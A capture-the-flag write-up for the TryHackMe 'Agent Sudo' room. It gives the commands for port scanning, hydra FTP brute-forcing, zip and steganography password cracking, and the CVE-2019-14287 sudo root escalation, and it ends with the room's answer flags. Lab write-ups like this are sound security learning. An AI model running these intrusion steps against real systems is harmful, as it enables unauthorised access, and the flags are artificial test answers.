# Agent-Sudo-CTF

https://tryhackme.com/room/agentsudoctf

**Use sudo nmap -sS -sV  10.10.230.248 to scan for open ports**

	PORT   STATE SERVICE VERSION

	21/tcp open  ftp     vsftpd 3.0.3

	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))


From the html site the following clue is given:

	Dear agents,

	Use your own codename as user-agent to access the site.

	From,

	Agent R 

Download the User Agent Switcher from plugin in Firefox. Use the clue given in the question (Agent C)

In the user agent plugin , use user-agent as C and refresh the tab. And the following clue will be given:

	Attention chris,

	Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
	
	From,

	Agent R 

**Use hydra -t 4 -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.230.248 to bruteforce a password**

	21][ftp] host: 10.10.230.248   login: chris   password: crystal

get the following files:

	-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
	-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
	-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png

cat To-agentJ.txt :

	Dear agent J,

	All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

	From,

	Agent C

**binwalk the png file and extract all contents**

**Use zip2john to create a hash for the locked text file : zip2john 8702.zip > output.txt**

**Use john the ripper to crack the password : john --format=zip output.txt** 

	alien            (8702.zip/To_agentR.txt)

Unlock the txt file :

	Agent C,

	We need to send the picture to 'QXJlYTUx' as soon as possible!

	By,

	Agent R

**download and install stegseek from https://github.com/RickdeJager/stegseek which uncovers passwords in seconds**

	stegSeek 0.6 - https://github.com/RickdeJager/StegSeek

	[i] Found passphrase: "Area51"         
	[i] Original filename: "message.txt".
	[i] Extracting to "cute-alien.jpg.out".

Open cute-alien.jpg.out to find more details:

	Hi james,

	Glad you find this message. Your login password is hackerrules!

	Don't ask me why the password look cheesy, ask agent R who set this password for you.

	Your buddy,

	chris

**sudo ssh james@10.10.149.203 with the password hackerrules!**

cat user_flag.txt for the first flag

scp the Alien_autospy.jpg and check online for the info of the photo

**sudo -l :**

	User james may run the following commands on agent-sudo:
    	(ALL, !root) /bin/bash

Run a google search with (ALL, !root) /bin/bash and the following result will appear https://www.exploit-db.com/exploits/47502 : CVE-2019-14287

**Use sudo -u#-1 /bin/bash to gain root access** 

cd root and get the final flag and also Agent R's real name

###### What is the user flag?

🏴‍☠️ b03d975e8c92a7c04146cfa7a5a313c7

###### What is the root flag?

🏴‍☠️ b53a02f55b57d4439e3341834d70c062



